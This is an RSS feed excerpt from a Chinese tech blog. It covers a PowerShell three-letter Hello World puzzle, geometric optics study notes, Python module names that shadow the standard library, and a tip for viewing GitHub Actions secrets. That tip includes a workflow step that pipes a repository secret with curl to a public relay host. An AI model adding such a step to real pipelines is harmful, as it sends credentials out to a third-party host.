&amp;lt;td class=&amp;quot;h&amp;quot;&amp;gt;邪恶&amp;lt;/td&amp;gt;
&amp;lt;td&amp;gt;
&amp;lt;img src=&amp;quot;https://www.electronjs.org/assets/img/logo.svg&amp;quot;&amp;gt;
&amp;lt;/td&amp;gt;
&amp;lt;td&amp;gt;
&amp;lt;img src=&amp;quot;https://webassembly.org/css/webassembly.svg&amp;quot;&amp;gt;
&amp;lt;/td&amp;gt;
&amp;lt;td&amp;gt;
&amp;lt;img style=&amp;quot;background-color: rgb(52, 0, 104);&amp;quot;
src=&amp;quot;https://images.squarespace-cdn.com/content/v1/6213c340453c3f502425776e/330e6487-af90-43c8-a255-63b3440d0e34/StabilityAi_Logo_White-19.png?format=1500w&amp;quot;&amp;gt;
&amp;lt;/td&amp;gt;
&amp;lt;/tr&amp;gt;
&amp;lt;tr&amp;gt;
&amp;lt;td&amp;gt;用户的电脑&amp;lt;br /&amp;gt;也是服务端&amp;lt;/td&amp;gt;
&amp;lt;td&amp;gt;&amp;lt;div class=&amp;quot;cat&amp;quot;&amp;gt;守序邪恶&amp;lt;/div&amp;gt; Electron 是 SSR&amp;lt;/td&amp;gt;
&amp;lt;td&amp;gt;&amp;lt;div class=&amp;quot;cat&amp;quot;&amp;gt;中立邪恶&amp;lt;/div&amp;gt; WASM 是 SSR&amp;lt;/td&amp;gt;
&amp;lt;td&amp;gt;&amp;lt;div class=&amp;quot;cat&amp;quot;&amp;gt;混乱邪恶&amp;lt;/div&amp;gt; Stable Diffusion 是 SSR&amp;lt;/td&amp;gt;
&amp;lt;/tr&amp;gt;
&amp;lt;/tbody&amp;gt;
&amp;lt;/table&amp;gt;
&amp;lt;blockquote&amp;gt;&amp;lt;i class=&amp;quot;fa-sharp fa-solid fa-lightbulb&amp;quot;&amp;gt;&amp;lt;/i&amp;gt; 此 meme 受&amp;lt;span class=&amp;quot;pn outer&amp;quot;&amp;gt;&amp;lt;span class=&amp;quot;pn inner&amp;quot;&amp;gt;梨咕米&amp;lt;/span&amp;gt;&amp;lt;/span&amp;gt;启发而成。&amp;lt;/blockquote&amp;gt;&amp;lt;p&amp;gt;&amp;lt;/p&amp;gt;
&amp;lt;style&amp;gt;
table.alignment-chart{
text-align: center;
width: 100%;
margin: auto;
min-width: 648px;
overflow-x: scroll;
}
table.alignment-chart img {
max-width: 120px;
max-height: 100px;
margin: auto;
}
table.alignment-chart td {
padding: 6px;
}
table.alignment-chart td,
table.alignment-chart th {
width: 25%;
}
th.h &amp;gt; div {
font-weight: 400;
font-size: 100%;
}
.h {
font-weight: 700;
font-size: 115%;
}
td &amp;gt; div.cat {
font-weight: 600;
font-size: 120%;
}
.pn.inner {
margin: 0 0em;
}
.pn.outer {
border-bottom: 1px solid;
margin: 0 1px;
}
&amp;lt;/style&amp;gt;&lt;/p&gt;
</content:encoded></item><item><title>三键成码：在 Powershell 中用三个字母和任意符号输出 Hello World</title><link>https://blog.xinshijiededa.men/three-keys-hello-world-in-powershell/</link><guid isPermaLink="true">https://blog.xinshijiededa.men/three-keys-hello-world-in-powershell/</guid><description>三键成码一项编程比赛，要求参赛者仅用三个字母或数字以及任意数量的符号编码输出 Hello, World!，并且文件体积最小者获胜——为什么不试试 M$ 的功率壳呢？</description><pubDate>Wed, 05 Apr 2023 23:40:00 GMT</pubDate><content:encoded>&lt;p&gt;其实 &lt;a href=&quot;https://github.com/InvoluteHell/ThreeKeysProgramming/tree/master/OverflowCat&quot;&gt;这篇文章&lt;/a&gt; 在去年暑假就已经写好，不过最近我的 &lt;a href=&quot;https://github.com/InvoluteHell/ThreeKeysProgramming/pull/36&quot;&gt;pull request&lt;/a&gt; 才被合并，已经快忘掉了。现修缮后发出来。&lt;/p&gt;
&lt;h2&gt;规则&lt;/h2&gt;
&lt;p&gt;三键成码一项编程比赛，要求参赛者仅用三个字母或数字以及任意数量的符号编码输出 &lt;code&gt;Hello, World!&lt;/code&gt;，并且文件体积最小者获胜。以下是详细规则：&lt;/p&gt;
&lt;blockquote&gt;
&lt;ol&gt;
&lt;li&gt;参赛选手自行挑选三个「字母 / 数字」来编写代码，代码中的「字母 / 数字」&lt;strong&gt;只能且必须&lt;/strong&gt; 有这三个（大小写算两个不同的键）&lt;/li&gt;
&lt;li&gt;除此三个「字母 / 数字」外，额外允许使用普通键盘上的所有 ASCII 符号（例如 &lt;code&gt;{&lt;/code&gt;, &lt;code&gt;;&lt;/code&gt; 等）&lt;/li&gt;
&lt;li&gt;该程序运行后输出 &lt;code&gt;Hello, World!&lt;/code&gt;, 有且仅有该内容，要求分毫不差，注意大小写和符号&lt;/li&gt;
&lt;li&gt;上传的所有文件体积最小者获胜！（结果截图、说明文档等的不算）&lt;/li&gt;
&lt;li&gt;不限编程语言，但禁止使用极小众语言；我们对极小众的定义是：&lt;a href=&quot;https://madnight.github.io/githut/#/pull_requests/2022/1&quot;&gt;Github 语言统计&lt;/a&gt; 上从未出现过的语言&lt;/li&gt;
&lt;li&gt;所有的依赖条件均需是在本比赛开始前就是已有的；否则请上传，作为文件内容统计的一部分！&lt;/li&gt;
&lt;li&gt;要求使用平庸的编译/执行命令、测试环境、文件名，除平庸部分外，其余部分也需要符合上述 1, 2 两条的要求&lt;/li&gt;
&lt;li&gt;静态类型语言的入口函数名，不受 1 中的限制。例如 C 语言的 &lt;code&gt;int main&lt;/code&gt;, Java 的 &lt;code&gt;public static void main&lt;/code&gt; 等&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;p&gt;截至 2023 年 3 月，PowerShell 在 GitHub 使用量排第 32 名，占比 0.102%，符合要求。[^3psrank]&lt;/p&gt;
&lt;p&gt;[^3psrank]: 点击第 5 条规则中的链接查看。&lt;/p&gt;
&lt;h2&gt;代码&lt;/h2&gt;
&lt;p&gt;选择的 3 个字母：&lt;code&gt;i&lt;/code&gt;、&lt;code&gt;e&lt;/code&gt;、&lt;code&gt;x&lt;/code&gt;。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;$i=$?+$?
$e=$i+$i
$xi=$x=$e+$i
$xe=&amp;quot;&amp;quot;+$x+$x
$xx=&amp;quot;&amp;quot;+$x+--$e
$x=(&amp;quot;&amp;quot;+$?)[$i]
iex &amp;quot;`$ex=&amp;quot;&amp;quot;``$x{$xe}&amp;quot;&amp;quot;;`$xe=&amp;quot;&amp;quot;``$x{$xx}&amp;quot;&amp;quot;&amp;quot;
$ii=$e+++$i
$ix=$ii+$i
$ei=$e*$i
$x=&amp;quot;``$x{&amp;quot;
iex &amp;quot;`$e=&amp;quot;&amp;quot;$x$e$ei}e$x$xi$xe}$x$xi$xe}$x$xi$ex}, $x$ii$ix}$x$xi$ex}$x$ix$i}$x$xi$xe}$x$xi$e}!&amp;quot;&amp;quot;&amp;quot;
$e
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;压成一行时语句结尾需要有分号。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;$i=$?+$?;$e=$i+$i;$xi=$x=$e+$i;$xe=&amp;quot;&amp;quot;+$x+$x;$xx=&amp;quot;&amp;quot;+$x+--$e;$x=(&amp;quot;&amp;quot;+$?)[$i];iex &amp;quot;`$ex=&amp;quot;&amp;quot;``$x{$xe}&amp;quot;&amp;quot;;`$xe=&amp;quot;&amp;quot;``$x{$xx}&amp;quot;&amp;quot;&amp;quot;;$ii=$e+++$i;$ix=$ii+$i;$ei=$e*$i;$x=&amp;quot;``$x{&amp;quot;;iex &amp;quot;`$e=&amp;quot;&amp;quot;$x$e$ei}e$x$xi$xe}$x$xi$xe}$x$xi$ex}, $x$ii$ix}$x$xi$ex}$x$ix$i}$x$xi$xe}$x$xi$e}!&amp;quot;&amp;quot;&amp;quot;;$e
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;环境&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;PowerShell 7.2.5&lt;/strong&gt;，需要自行安装，Windows 自带的版本较旧，没有 Unicode 转义字符。&lt;/p&gt;
&lt;p&gt;代码可以在终端直接粘贴，或者通过 &lt;code&gt;.\x.ps1&lt;/code&gt; 运行。&lt;/p&gt;
&lt;h2&gt;原理&lt;/h2&gt;
&lt;h3&gt;选择字母&lt;/h3&gt;
&lt;p&gt;让我们先来看看其他提交者所用的语言中是怎么做到的：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;JavaScript 有 &lt;a href=&quot;http://www.jsfuck.com/&quot;&gt;JSFuck&lt;/a&gt; 这种东西，甚至可以只有符号，自然是不消说的&lt;/li&gt;
&lt;li&gt;Python 版本中选择了 &lt;code&gt;exec&lt;/code&gt;——Python 中的 &lt;code&gt;eval&lt;/code&gt; 只能执行单纯的表达式，无法创建变量，而且需要 4 个字母；而 &lt;code&gt;exec&lt;/code&gt; 可以执行代码块&lt;/li&gt;
&lt;li&gt;Bash 用了 &lt;code&gt;tr&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Ruby 选了 &lt;code&gt;c&lt;/code&gt; 和另外两个数字——Ruby 中 &lt;code&gt;&amp;amp;lt;&amp;amp;lt;&lt;/code&gt; 是字符串连接运算符，&lt;code&gt;$&amp;gt;&lt;/code&gt; 是 &lt;code&gt;stdout&lt;/code&gt;，后面用格式化字符串 &lt;code&gt;&amp;quot;%c&amp;quot;&lt;/code&gt; 和一个整数数组&lt;/li&gt;
&lt;li&gt;C 利用了 UB 和不平凡的编译命令&lt;/li&gt;
&lt;li&gt;PHP 选了 &lt;code&gt;H&lt;/code&gt;、&lt;code&gt;e&lt;/code&gt;、&lt;code&gt;l&lt;/code&gt;，剩下的字符惊为天人，不知道是利用了什么隐式类型转换，看不懂&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;PowerShell 中无法对 Char 进行加减操作，显式地进行类型转换也需要类似 &lt;code&gt;[char]65&lt;/code&gt; 至少 4 个字母。[^3key1] 所以只能考虑 eval。PowerShell 中的命令名都很长，不过 Invoke-Expression 有别名 &lt;code&gt;iex&lt;/code&gt;。另外有一个可以执行字符串的操作符 &lt;code&gt;&amp;amp;&lt;/code&gt;，但是只能是命令名，不能带参数。[^3key2]&lt;/p&gt;
&lt;p&gt;[^3key1]: &amp;lt;a href=&amp;quot;https://community.idera.com/database-tools/powershell/powertips/b/tips/posts/converting-ascii-and-characters&amp;quot;&amp;gt;Converting ASCII and Characters - Power Tips - Power Tips - IDERA Community&amp;lt;/a&amp;gt;
[^3key2]: &amp;lt;a href=&amp;quot;https://stackoverflow.com/questions/50018274/why-does-invoke-operator-and-invoke-expression-produce-different-results-for&amp;quot;&amp;gt;Why does invoke operator (&amp;amp; and Invoke-Expression produce different results for the same input? - Stack Overflow)&amp;lt;/a&amp;gt;&lt;/p&gt;
&lt;h3&gt;第一个数字&lt;/h3&gt;
&lt;p&gt;因为不能直接出现数字了，所以需要想办法得到第一个 Int 类型的值。发现数组下标为空字符串 &lt;code&gt;&apos;&apos;&lt;/code&gt; 时可以得到数组的第一个元素，但是如果想要后面的字母的话，PowerShell 并没有提供 pop 等函数。[^3key3]
数字字面量也都至少需要有 &lt;code&gt;0&lt;/code&gt; 出现。所以只能通过其他类型隐式转换出 Int 来。&lt;/p&gt;
&lt;p&gt;[^3key3]: &amp;lt;a href=&amp;quot;https://stackoverflow.com/questions/24754822/powershell-remove-item-0-from-an-array&amp;quot;&amp;gt;PowerShell Remove item 0 from an array - Stack Overflow&amp;lt;/a&amp;gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;$i = $? + $?
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;$?&lt;/code&gt; 表示上一条命令的返回值，在初始时和上一条命令没有出错时为 &lt;code&gt;True&lt;/code&gt;。[^3key4]&lt;/li&gt;
&lt;li&gt;PowerShell 中的 &lt;code&gt;==&lt;/code&gt; 是 &lt;code&gt;-eq&lt;/code&gt;，需要额外的字母。&lt;/li&gt;
&lt;li&gt;当 Bool 类型转换为整数时，&lt;code&gt;True&lt;/code&gt; 是 &lt;code&gt;1&lt;/code&gt;，故 &lt;code&gt;$i&lt;/code&gt; 为 &lt;code&gt;2&lt;/code&gt;。[^3key5]&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;剩下的大部分操作都是在构造其他数字，代码的长度应该可以再压缩一点。&lt;/p&gt;
&lt;p&gt;[^3key4]: &amp;lt;a href=&amp;quot;https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_automatic_variables?view=powershell-7.2#section-1&amp;quot;&amp;gt;$? - PowerShell Core - About - Automatic Variables&amp;lt;/a&amp;gt;
[^3key5]: &amp;lt;a href=&amp;quot;https://docs.microsoft.com/en-us/powershell/scripting/lang-spec/chapter-06?view=powershell-7.2#64-conversion-to-integer&amp;quot;&amp;gt;Conversion#Conversion to integer&amp;lt;/a&amp;gt;&lt;/p&gt;
&lt;h3&gt;构造 Unicode&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;$x = (&amp;quot;&amp;quot; + $?)[$i]
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;+&lt;/code&gt; 运算符的两个参数类型不一致的时候，会将第二个参数隐式转换为第一个参数的类型。故此处 &lt;code&gt;$e&lt;/code&gt; 为 String &lt;code&gt;&amp;quot;True&amp;quot;&lt;/code&gt;。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;至此，我们有了所需的数字和字母 &lt;code&gt;u&lt;/code&gt;，可以用 &lt;code&gt;&amp;quot;u{x}&amp;quot;&lt;/code&gt; 来生成一切字符了。不过，&lt;code&gt;&amp;quot;Hello World!&amp;quot;&lt;/code&gt; 除了可以直接输入的 &lt;code&gt;e&lt;/code&gt;、空格和 &lt;code&gt;!&lt;/code&gt;，十六进制值中还需要 &lt;code&gt;c&lt;/code&gt; 和 &lt;code&gt;f&lt;/code&gt;。幸好这两个的编码分别为 &lt;code&gt;63&lt;/code&gt; 和 &lt;code&gt;66&lt;/code&gt;，没有 a-f 出现。&lt;code&gt;$e&lt;/code&gt; 实际上就是：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;$e = &amp;quot;``u{48}e``u{6c}``u{6c}``u{6f}, ``u{57}``u{6f}``u{72}``u{6c}``u{64}!&amp;quot;;
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;转义字符&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;iex &amp;quot;`$ex=&amp;quot;&amp;quot;``$x{$xe}&amp;quot;&amp;quot;;`$xe=&amp;quot;&amp;quot;``$x{$xx}&amp;quot;&amp;quot;&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;字符串用双引号的好处是可以直接嵌入变量。如果要 escape 的话，需要在 &lt;code&gt;$&lt;/code&gt;、&lt;code&gt;&amp;quot;&lt;/code&gt;、&lt;code&gt;`&lt;/code&gt; 前面加上 &lt;code&gt;`&lt;/code&gt;；&lt;code&gt;&amp;quot;&lt;/code&gt; 也可以自身重复两次 &lt;code&gt;&amp;quot;&amp;quot;&lt;/code&gt; 来 escape。[^3key6]&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;[^3key6]: &amp;lt;a href=&amp;quot;https://www.rlmueller.net/PowerShellEscape.htm&amp;quot;&amp;gt;Escaping in PowerShell&amp;lt;/a&amp;gt;&lt;/p&gt;
&lt;h3&gt;打印值&lt;/h3&gt;
&lt;p&gt;PowerShell 默认打印出前一个表达式的值，所以不需要拼凑出 &lt;code&gt;&amp;quot;echo&amp;quot;&lt;/code&gt; 再 &lt;code&gt;iex&lt;/code&gt; 什么的。&lt;/p&gt;
&lt;h3&gt;其他可能的方法&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;变量赋值时可以直接是命令的输出。比如旧版 PowerShell 可以通过 &lt;code&gt;$ls = ls; $ls[x][x]&lt;/code&gt; 拿到 ls 命令表头具体的一个 Char，或许有的命令的输出包含全部所需的字母。但是新版中大部分命令的输出不再是字符串而是对象了，两次下标拿到的仍然和原结果一样。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;$error&lt;/code&gt; 是一个存放了错误信息字符串的数组。[^3key7] 不过，错误会直接输出，不符合「该程序运行后输出 Hello, World!, 有且仅有该内容，要求分毫不差」的要求。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;[^3key7]: &amp;lt;a href=&amp;quot;https://www.tutorialspoint.com/what-is-use-of-error-variable-in-powershell&amp;quot;&amp;gt;What is use of $error variable in PowerShell?&amp;lt;/a&amp;gt;&lt;/p&gt;
</content:encoded></item><item><title>几何光学的基本概念</title><link>https://blog.xinshijiededa.men/geometric-optics/</link><guid isPermaLink="true">https://blog.xinshijiededa.men/geometric-optics/</guid><description>几何光学复/预习指南</description><pubDate>Tue, 07 Mar 2023 23:29:00 GMT</pubDate><content:encoded>&lt;p&gt;import C from &amp;quot;@/components/Cloze.astro&amp;quot;;&lt;/p&gt;
&lt;p&gt;几何光学：&amp;lt;C&amp;gt;光线&amp;lt;/C&amp;gt; 的概念为基础，用 &amp;lt;C&amp;gt;几何&amp;lt;/C&amp;gt; 的方法研究光在介质中的传播规律和光学系统成像特征．&lt;/p&gt;
&lt;h2&gt;光波与光线&lt;/h2&gt;
&lt;p&gt;光从本质上来就是 &amp;lt;C&amp;gt;电磁波&amp;lt;/C&amp;gt;；光的传播实质上是 &amp;lt;C&amp;gt;电磁波的传播&amp;lt;/C&amp;gt;．&lt;/p&gt;
&lt;h3&gt;波长&lt;/h3&gt;
&lt;p&gt;红外线的波长比可见光 &amp;lt;C&amp;gt;长&amp;lt;/C&amp;gt;；&lt;/p&gt;
&lt;p&gt;紫外线的波长比可见光 &amp;lt;C&amp;gt;短&amp;lt;/C&amp;gt;．&lt;/p&gt;
&lt;p&gt;光速、频率与波长的关系：&lt;/p&gt;
&lt;p&gt;$$ \nu=\dfrac c \lambda. $$&lt;/p&gt;
&lt;p&gt;（不能写成其他形式）&lt;/p&gt;
&lt;h3&gt;光源和光线&lt;/h3&gt;
&lt;p&gt;光源（发光体）是 &amp;lt;C&amp;gt;能够辐射光能量&amp;lt;/C&amp;gt; 的物体．&lt;/p&gt;
&lt;p&gt;光线是 &amp;lt;C&amp;gt;携带能量并带有方向&amp;lt;/C&amp;gt; 的几何线．&lt;/p&gt;
&lt;p&gt;&amp;lt;C&amp;gt;光线的方向&amp;lt;/C&amp;gt; 代表光的传播方向．&lt;/p&gt;
&lt;p&gt;&amp;lt;C&amp;gt;光线的传播途径&amp;lt;/C&amp;gt; 称为光路．&lt;/p&gt;
&lt;h3&gt;波面&lt;/h3&gt;
&lt;p&gt;光波向周围传播，在某一时刻，其振动位相相同的各点所构成的 &amp;lt;C&amp;gt;等相位面&amp;lt;/C&amp;gt; 称为波阵面，简称波面．可分为 &amp;lt;C&amp;gt;平面波，球面波或任意曲面波&amp;lt;/C&amp;gt;．&lt;/p&gt;
&lt;p&gt;在各向同性介质中，光沿着波面法线方向传播，所以可以认为 &amp;lt;C&amp;gt;光波波面法线&amp;lt;/C&amp;gt; 就是几何光学中的光线．&lt;/p&gt;
&lt;p&gt;波前（wavefront）: The surface reached by wave propagation at any time.&lt;/p&gt;
&lt;h2&gt;基本定律&lt;/h2&gt;
&lt;h3&gt;光的直线传播定律&lt;/h3&gt;
&lt;p&gt;在 &amp;lt;C&amp;gt;各向同性的均匀介质&amp;lt;/C&amp;gt; 中，光线按直线传播．&lt;/p&gt;
&lt;h3&gt;光线的独立传播定律&lt;/h3&gt;
&lt;p&gt;光线的独立传播定律不符合 &amp;lt;C&amp;gt;光的干涉现象&amp;lt;/C&amp;gt;．&lt;/p&gt;
&lt;h3&gt;光的折射和反射定律&lt;/h3&gt;
&lt;h4&gt;折射定律&lt;/h4&gt;
&lt;p&gt;折射率越大，介质对光线的折射能力越强。如，空气的折射率约为 $1.00$，水的折射率约为 $1.33$，则光线从空气射入水中时，入射角 $\geq$ 折射角。&lt;/p&gt;
&lt;p&gt;折射定律的公式：&lt;/p&gt;
&lt;p&gt;$$ n&apos;\sin I&apos;=n\sin I. $$&lt;/p&gt;
&lt;p&gt;若在此式中令 $n&apos;=-n$，则有 $I&apos;=-I$，即反射定律．&lt;/p&gt;
&lt;h4&gt;角的正负&lt;/h4&gt;
&lt;p&gt;由 &amp;lt;C&amp;gt;光线转向法线&amp;lt;/C&amp;gt;， &amp;lt;C&amp;gt;顺&amp;lt;/C&amp;gt; 时针方向旋转形成的角度为正，反之为负．&lt;/p&gt;
&lt;p&gt;在反射定律中，反射光线和入射光线位于法线的两侧，且反射角与入射角的绝对值相等，符号相反．&lt;/p&gt;
&lt;h4&gt;全反射&lt;/h4&gt;
&lt;p&gt;全反射现象发生的条件：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;光线从 &amp;lt;C&amp;gt;光密&amp;lt;/C&amp;gt; 介质射向 &amp;lt;C&amp;gt;光疏&amp;lt;/C&amp;gt; 介质；&lt;/li&gt;
&lt;li&gt;入射角大于临界角．&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;临界角 $\sin I_m = \dfrac{n&apos;\sin I&apos;}n = \dfrac{n&apos;}n\sin 90° = \dfrac{n&apos;}n$，其中 $n \gt n&apos;$．&lt;/p&gt;
&lt;h3&gt;马吕斯定律&lt;/h3&gt;
&lt;p&gt;马吕斯定律（Theorem of Malus）是指光线束在各向同性的均匀介质中传播时，始终 &amp;lt;C&amp;gt;保持着与波面的正交性&amp;lt;/C&amp;gt;，并且入射波面与出射波面对应点之间的 &amp;lt;C&amp;gt;光程&amp;lt;/C&amp;gt; 为定值．&lt;/p&gt;
&lt;h3&gt;费马原理&lt;/h3&gt;
&lt;p&gt;费马原理（Fermat&apos;s principle）是指光是沿着光程为 &amp;lt;C&amp;gt;极值（极大、极小或常量）&amp;lt;/C&amp;gt; 的路径传播的．&lt;/p&gt;
&lt;p&gt;&amp;lt;C&amp;gt;折/反射定律、费马原理和马吕斯定律&amp;lt;/C&amp;gt; 三者中的任意一个，均可以视为几何光学的一个基本定律，而把另外两个作为该基本定律的推论．&lt;/p&gt;
</content:encoded></item><item><title>如何方便地查看 Github Actions secrets</title><link>https://blog.xinshijiededa.men/github-actions-secrets/</link><guid isPermaLink="true">https://blog.xinshijiededa.men/github-actions-secrets/</guid><description>在 GitHub 仓库 Settings 页面中设置的 Actions secrets and variables 是只能重新填写的。同时，在 Action 执行的 log 里所有 secrets 都会被星号打码。不过，可以通过创建一个 Action 来方便地查看我们设置的 token。</description><pubDate>Thu, 02 Feb 2023 20:38:42 GMT</pubDate><content:encoded>&lt;p&gt;在 GitHub 仓库 Settings 页面中设置的 Actions secrets and variables 是只能重新填写的。同时，在 Action 执行的 log 里所有 secrets 都会被星号打码。不过，可以通过创建一个 Action 来方便地查看我们设置的 token。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-yaml&quot;&gt;name: View GitHub Actions secrets
on:
  push:
    branches: [master]
  workflow_dispatch:
  # 可以在仓库的 Actions 页面中手动触发

jobs:
  github-actions-environment-variables-ubuntu:
    runs-on: ubuntu-latest
    steps:
      - name: Get env
        run: env
      - name: Transfer secrets
        run: &amp;quot;echo &apos;Token XXXX: ${{secrets.XXXX}}&apos; | curl -T - https://ppng.io/自己设定的一段口令&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在你的设备上运行 &lt;code&gt;curl https://ppng.io/自己设定的一段口令&lt;/code&gt; 后再运行上述 action 就可以看到啦。&lt;/p&gt;
</content:encoded></item><item><title>你不应该使用的 Python 文件名</title><link>https://blog.xinshijiededa.men/python-filenames-you-should-avoid/</link><guid isPermaLink="true">https://blog.xinshijiededa.men/python-filenames-you-should-avoid/</guid><description>最末的结论是，你不应该使用以下名称作为 Python 代码的文件/模块名</description><pubDate>Mon, 16 Jan 2023 14:58:08 GMT</pubDate><content:encoded>&lt;p&gt;在新 VPS 上运行 Python 程序的时候出现了问题：&lt;a href=&quot;https://pdm.fming.dev/latest/&quot;&gt;&lt;code&gt;pdm&lt;/code&gt;&lt;/a&gt; 无法正常 install 或者设置 config，&lt;code&gt;poetry&lt;/code&gt; 可以但是无法正常运行。两者都在获取运行环境的时候发生了同样的错误。以下是一个最小复现例子：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-sh&quot;&gt;[neko@host temp]$ ls
select.py
[neko@host temp]$ cat select.py
print(&amp;quot;hello, world!&amp;quot;)
[neko@host temp]$ python
Python 3.10.9 (main, Dec 19 2022, 17:35:49) [GCC 12.2.0] on linux
Type &amp;quot;help&amp;quot;, &amp;quot;copyright&amp;quot;, &amp;quot;credits&amp;quot; or &amp;quot;license&amp;quot; for more information.
&amp;gt;&amp;gt;&amp;gt; import platform
hello, world!
Traceback (most recent call last):
  File &amp;quot;/usr/lib/python3.10/subprocess.py&amp;quot;, line 69, in &amp;lt;module&amp;gt;
    import msvcrt
ModuleNotFoundError: No module named &apos;msvcrt&apos;

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File &amp;quot;&amp;lt;stdin&amp;gt;&amp;quot;, line 1, in &amp;lt;module&amp;gt;
  File &amp;quot;/usr/lib/python3.10/platform.py&amp;quot;, line 119, in &amp;lt;module&amp;gt;
    import subprocess
  File &amp;quot;/usr/lib/python3.10/subprocess.py&amp;quot;, line 76, in &amp;lt;module&amp;gt;
    import selectors
  File &amp;quot;/usr/lib/python3.10/selectors.py&amp;quot;, line 291, in &amp;lt;module&amp;gt;
    class SelectSelector(_BaseSelectorImpl):
  File &amp;quot;/usr/lib/python3.10/selectors.py&amp;quot;, line 318, in SelectSelector
    _select = select.select
AttributeError: module &apos;select&apos; has no attribute &apos;select&apos;
&amp;gt;&amp;gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;我一 Linux 怎么会需要 &lt;code&gt;msvcrt&lt;/code&gt;？&lt;s&gt;一开始以为是 Arch 仓库里的 Python 有问题&lt;/s&gt;，或者是 &lt;code&gt;pip&lt;/code&gt; 安装的时候在 root 用户操作而破坏了系统，但是重装了几次全部依赖也没有解决。排查许久后，发现只有在我的代码文件夹里进入 REPL &lt;code&gt;import platform&lt;/code&gt; 会报错。然后发现项目里用的一个模块的名称叫 &lt;code&gt;select.py&lt;/code&gt;。是的，导入 Python 内置的 &amp;lt;a href=&amp;quot;https://docs.python.org/3/library/index.html&amp;quot;&amp;gt;标准库 &amp;lt;i class=&amp;quot;fa-brands fa-python&amp;quot;&amp;gt;&amp;lt;/i&amp;gt;&amp;lt;/a&amp;gt; 的时候，&lt;strong&gt;标准库内部的 &lt;code&gt;import&lt;/code&gt; 也是在当前工作目录下进行的&lt;/strong&gt;（！）。&lt;/p&gt;
&lt;p&gt;最末的结论是，你不应该使用以下名称作为 Python 代码的文件/模块名：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;abc&lt;/code&gt;, &lt;code&gt;aifc&lt;/code&gt;, &lt;code&gt;argparse&lt;/code&gt;, &lt;code&gt;array&lt;/code&gt;, &lt;code&gt;ast&lt;/code&gt;, &lt;code&gt;asyncio&lt;/code&gt;, &lt;code&gt;atexit&lt;/code&gt;, &lt;code&gt;audioop&lt;/code&gt;, &lt;code&gt;base64&lt;/code&gt;, &lt;code&gt;bdb&lt;/code&gt;, &lt;code&gt;binascii&lt;/code&gt;, &lt;code&gt;bisect&lt;/code&gt;, &lt;code&gt;builtins&lt;/code&gt;, &lt;code&gt;bz2&lt;/code&gt;, &lt;code&gt;calendar&lt;/code&gt;, &lt;code&gt;cgi&lt;/code&gt;, &lt;code&gt;cgitb&lt;/code&gt;, &lt;code&gt;chunk&lt;/code&gt;, &lt;code&gt;cmath&lt;/code&gt;, &lt;code&gt;cmd&lt;/code&gt;, &lt;code&gt;code&lt;/code&gt;, &lt;code&gt;codecs&lt;/code&gt;, &lt;code&gt;codeop&lt;/code&gt;, &lt;code&gt;collections&lt;/code&gt;, &lt;code&gt;colorsys&lt;/code&gt;, &lt;code&gt;compileall&lt;/code&gt;, &lt;code&gt;concurrent&lt;/code&gt;, &lt;code&gt;configparser&lt;/code&gt;, &lt;code&gt;contextlib&lt;/code&gt;, &lt;code&gt;contextvars&lt;/code&gt;, &lt;code&gt;copy&lt;/code&gt;, &lt;code&gt;copyreg&lt;/code&gt;, &lt;code&gt;csv&lt;/code&gt;, &lt;code&gt;ctypes&lt;/code&gt;, &lt;code&gt;dataclasses&lt;/code&gt;, &lt;code&gt;datetime&lt;/code&gt;, &lt;code&gt;dbm&lt;/code&gt;, &lt;code&gt;decimal&lt;/code&gt;, &lt;code&gt;difflib&lt;/code&gt;, &lt;code&gt;dis&lt;/code&gt;, &lt;code&gt;doctest&lt;/code&gt;, &lt;code&gt;email&lt;/code&gt;, &lt;code&gt;ensurepip&lt;/code&gt;, &lt;code&gt;enum&lt;/code&gt;, &lt;code&gt;errno&lt;/code&gt;, &lt;code&gt;faulthandler&lt;/code&gt;, &lt;code&gt;filecmp&lt;/code&gt;, &lt;code&gt;fileinput&lt;/code&gt;, &lt;code&gt;fnmatch&lt;/code&gt;, &lt;code&gt;fractions&lt;/code&gt;, &lt;code&gt;ftplib&lt;/code&gt;, &lt;code&gt;functools&lt;/code&gt;, &lt;code&gt;gc&lt;/code&gt;, &lt;code&gt;getopt&lt;/code&gt;, &lt;code&gt;getpass&lt;/code&gt;, &lt;code&gt;gettext&lt;/code&gt;, &lt;code&gt;glob&lt;/code&gt;, &lt;code&gt;graphlib&lt;/code&gt;, &lt;code&gt;gzip&lt;/code&gt;, &lt;code&gt;hashlib&lt;/code&gt;, 